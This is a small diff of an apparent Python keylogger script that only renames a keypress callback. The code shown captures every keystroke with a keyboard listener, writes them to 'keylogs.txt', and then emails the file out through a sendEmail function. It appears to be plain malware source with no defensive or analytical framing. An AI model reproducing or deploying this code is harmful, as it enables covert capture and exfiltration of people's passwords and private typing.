@@ -41,10 +41,10 @@ def sendEmail(filename, attachment):
 
 log_dir = ""
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
-def on_press(key):
+def write_to_log(key):
     logging.info(str(key))
 
-with Listener(on_press=on_press) as listener:
+with Listener(on_press=write_to_log) as listener:
     listener.join()
 
 sendEmail("keylogs.txt", "path to kelogs.txt")
